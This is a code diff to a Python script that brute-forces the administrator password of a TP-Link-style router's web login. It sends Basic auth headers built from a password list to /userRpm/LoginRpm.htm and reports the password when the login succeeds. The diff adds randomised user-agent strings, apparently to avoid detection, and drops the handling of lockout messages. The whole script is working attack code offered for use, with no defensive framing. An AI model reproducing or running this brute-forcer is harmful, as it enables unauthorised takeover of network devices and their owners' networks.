@@ -1,8 +1,12 @@
+import colorama
 from colorama import *
 import requests
+import os
+import time
 import hashlib
 import base64
-import colorama
+import fake_useragent
+ua = fake_useragent.UserAgent()
 
 colorama.init(autoreset=True)
 print(Fore.RED + Back.BLACK + Style.BRIGHT + 'This Work Only In This Version')
@@ -21,7 +25,7 @@ for line in passinpot:
         'Authorization': 'Basic%20YWRtaW46' + encodedStr,
     }
     headers = {
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
+        'User-Agent': ua.random,
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.5',
         'Connection': 'keep-alive',
@@ -33,18 +37,14 @@ for line in passinpot:
     )
     response = requests.get('http://' + iprt + '/userRpm/LoginRpm.htm', params=params, cookies=cookies)
 
-    if 'The router allows only one administrator to login at the same time, please try again later.' in response.text:
-        print('Your address has been blocked\nchanging mac address...')
-        print(a)
-    if 'You have exceeded ten attempts, please try again after two hours' in response.text:
-        print('Your address has been blocked\nchanging mac address...')
-        print(a)
     if 'The username or password is incorrect, please input again' in response.text:
         print("Tring password" + ' ' + a)
+        os.system("CLS")
 
     if 'javaScript">window.parent.location.href = "http://' in response.text:
         print(Fore.YELLOW + 'Correct')
         print(Fore.GREEN + 'The password is')
         print(Fore.GREEN + Style.BRIGHT + a)
+        time.sleep(100000)
         break
 # _____________________________________________________________________________________________
